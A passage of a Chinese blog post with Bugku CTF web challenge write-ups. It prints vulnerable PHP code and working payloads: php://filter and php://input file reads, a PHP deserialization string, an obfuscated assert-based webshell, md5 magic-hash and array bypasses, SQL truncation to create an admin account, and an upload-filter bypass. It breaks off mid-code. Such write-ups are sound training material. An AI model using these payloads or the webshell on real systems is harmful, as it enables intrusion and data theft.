rel="noopener">http://120.24.86.145:8006/test1/</a> </p><p>作者：pupil </p></blockquote><p>解析WriteUp：<a href="https://ciphersaw.me/2018/01/03/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20welcome%20to%20bugkuctf/" target="_blank" rel="noopener">【Bugku CTF】 Web —— welcome to bugkuctf</a></p><p>查看源代码发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p>/test1/?file=php://filter/read=convert.base64-encode/resource=hint.php&amp;txt=php://input</p><p>post请求：welcome to the bugkuctf</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527139396259.png" alt="1527139396259"></p><p>base64解码得</p><p>hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同理拿到index.php源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p>/test1/?file=hint.php&amp;txt=php://input&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527139347636.png" alt="1527139347636"></p><blockquote><p>flag{php_is_the_best_language}</p></blockquote><h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><blockquote><p><a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">http://120.24.86.145:8010/</a></p><p>送给大家一个过狗一句话</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc);   $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>];</span><br><span class="line">$poc_2($_GET[<span class="string">'s'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><blockquote><p><code>http://120.24.86.145:8010/?s=print_r(scandir(&#39;./&#39;));</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; 1.php</span><br><span class="line">    [3] =&gt; 123.txt</span><br><span class="line">    [4] =&gt; 2.php</span><br><span class="line">    [5] =&gt; 3.php</span><br><span class="line">    [6] =&gt; 4.php</span><br><span class="line">    [7] =&gt; 5.php</span><br><span class="line">    [8] =&gt; &lt;?php eval(</span><br><span class="line">    [9] =&gt; &lt;?php eval($_POST[1])</span><br><span class="line">    [10] =&gt; &lt;?php eval(\$_POST[1])</span><br><span class="line">    [11] =&gt; README.README</span><br><span class="line">    [12] =&gt; a.php</span><br><span class="line">    [13] =&gt; a.txt</span><br><span class="line">    [14] =&gt; c.php</span><br><span class="line">    [15] =&gt; chaoba</span><br><span class="line">    [16] =&gt; chaoba.aspx</span><br><span class="line">    [17] =&gt; chaoba1.php</span><br><span class="line">    [18] =&gt; chaoba2.php</span><br><span class="line">    [19] =&gt; conn</span><br><span class="line">    [20] =&gt; ddee.php</span><br><span class="line">    [21] =&gt; f.html</span><br><span class="line">    [22] =&gt; f.php</span><br><span class="line">    [23] =&gt; flag.txt</span><br><span class="line">    [24] =&gt; h.php</span><br><span class="line">    [25] =&gt; haha.php</span><br><span class="line">    [26] =&gt; index.php</span><br><span class="line">    [27] =&gt; ldl.txt</span><br><span class="line">    [28] =&gt; ll.php</span><br><span class="line">    [29] =&gt; loshell.php</span><br><span class="line">    [30] =&gt; olivia.txt</span><br><span class="line">    [31] =&gt; oudeniu.php</span><br><span class="line">    [32] =&gt; phpspy1.php</span><br><span class="line">    [33] =&gt; q.php</span><br><span class="line">    [34] =&gt; t2.php</span><br><span class="line">    [35] =&gt; testfile.txt</span><br><span class="line">    [36] =&gt; txxxc.php</span><br><span class="line">    [37] =&gt; x.php</span><br><span class="line">    [38] =&gt; xb.php</span><br><span class="line">    [39] =&gt; xxoo.php</span><br><span class="line">    [40] =&gt; xxoos.php</span><br><span class="line">    [41] =&gt; xxx.php</span><br><span class="line">    [42] =&gt; zaizheliflag.txt</span><br><span class="line">    [43] =&gt; zx.php</span><br><span class="line">)</span><br><span class="line">¿ÓµùµÄÌâÄ¿£¬To JBfei£¡</span><br></pre></td></tr></table></figure><p>访问flag.txt</p><blockquote><p>BUGKU{bugku_web_009801_a}</p></blockquote><h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><blockquote><p>字符？正则？</p><p><a href="http://120.24.86.145:8002/web10/" target="_blank" rel="noopener">http://120.24.86.145:8002/web10/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就是考察正则表达式了</p><blockquote><p>1.表达式直接写出来的字符串直接利用，如key<br>2.“.”代表任意字符<br>3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以’^’开头，以’$’结束<br>4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束<br>5.[a-z]代表a-z中的任意一个字符<br>6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号<br>7./i代表大小写不敏感<br>8.{4-7}代表[0-9]中数字连续出现的次数是4-7次<br>9.\s匹配任意的空白符<br>10.\d   匹配数字<br>11.\b   匹配单词的开始或结束</p></blockquote><p>payload</p><blockquote><p>?id=key1key1111key:/a/keya!</p></blockquote><blockquote><p>KEY{0x0SIOPh550afc} </p></blockquote><p>参考：</p><p><a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">正则手册</a></p><p><a href="https://blog.csdn.net/u011377996/article/details/79340100#t2" target="_blank" rel="noopener">字符？正则？</a></p><h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><blockquote><p><a href="http://118.89.219.210:49162/" target="_blank" rel="noopener">http://118.89.219.210:49162/</a> </p><p>flag格式：SKCTF{xxxxxxxxxxxxxxxxxx} </p></blockquote><p>查看源代码发现</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527178429935.png" alt="1527178429935"></p><p>点击code.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5函数漏洞和strcmp数组绕过</p><p>payload</p><blockquote><p>?v1[]=0&amp;v2[]=1&amp;v3[]</p></blockquote><blockquote><p>SKCTF{Php_1s_tH3_B3St_L4NgUag3} </p></blockquote><h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><blockquote><p><a href="http://118.89.219.210:49163/" target="_blank" rel="noopener">http://118.89.219.210:49163/</a><br>flag格式：SKCTF{xxxxxxxxxxxxxxxxx}<br>hint:SQL约束攻击</p></blockquote><p><a href="https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">约束攻击</a>又称为长字节截断攻击 </p><p>原理：</p><p>在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断</p><p> 比如数据库user字段的类型为 varchar(8)</p><p>当插入user的值为  <code>admin                                     1</code>，password=123456时</p><p>会插入一个用户名为admin，密码为123456的用户，就成功创建了一个admin用户</p><p>注册一个</p><blockquote><p><code>admin                                                         1</code></p><p>ABCabc123</p></blockquote><p>登录一下拿到flag</p><blockquote><p>SKCTF{4Dm1n_HaV3_GreAt_p0w3R} </p></blockquote><h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><blockquote><p><a href="http://120.24.86.145:9009/from.php" target="_blank" rel="noopener">http://120.24.86.145:9009/from.php</a> </p></blockquote><p>修改一下请求报头的referer</p><p>payload</p><blockquote><p>Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p></blockquote><blockquote><p>flag{bug-ku_ai_admin}</p></blockquote><h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h2><blockquote><p><a href="http://120.24.86.145:9009/md5.php" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php</a> </p></blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p><a href="http://120.24.86.145:9009/md5.php?a=s878926199a" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php?a=s878926199a</a></p></blockquote><blockquote><p>flag{md5_collision_is_easy} </p></blockquote><h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><blockquote><p>各种绕过哟</p><p><a href="http://120.24.86.145:8002/web7/" target="_blank" rel="noopener">http://120.24.86.145:8002/web7/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]); </span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>又是md5，数组大法好</p><p>payload</p><blockquote><p><a href="http://120.24.86.145:8002/web7/index.php?uname[]=0&amp;id=margin" target="_blank" rel="noopener">http://120.24.86.145:8002/web7/index.php?uname[]=0&amp;id=margin</a></p><p>passwd[]=1</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527180001110.png" alt="1527180001110"></p><blockquote><p>flag{HACK_45hhs_213sDD} </p></blockquote><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><blockquote><p>txt？？？？</p><p><a href="http://120.24.86.145:8002/web8/" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p><a href="http://120.24.86.145:8002/web8/?ac=123456&amp;fn=php://input" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/?ac=123456&amp;fn=php://input</a></p><p>123456</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527180174518.png" alt="1527180174518"></p><blockquote><p>flag{3cfb7a90fc0de31}</p></blockquote><h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>​        1. 把请求头里面的Content-Type字母改成大写进行绕过</p><p>​        2. .jpg后面加上.php5其他的都被过滤了好像..</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1531387774496.png" alt="1531387774496"></p><p>参考链接</p><p><a href="https://blog.csdn.net/qq_40424939/article/details/80767321" target="_blank" rel="noopener">https://blog.csdn.net/qq_40424939/article/details/80767321</a></p><h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><blockquote><p>地址：<a href="http://120.24.86.145:8002/web15/" target="_blank" rel="noopener">http://120.24.86.145:8002/web15/</a> </p><p>flag格式：flag{xxxxxxxxxxxx} </p><p>不如写个Python吧 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 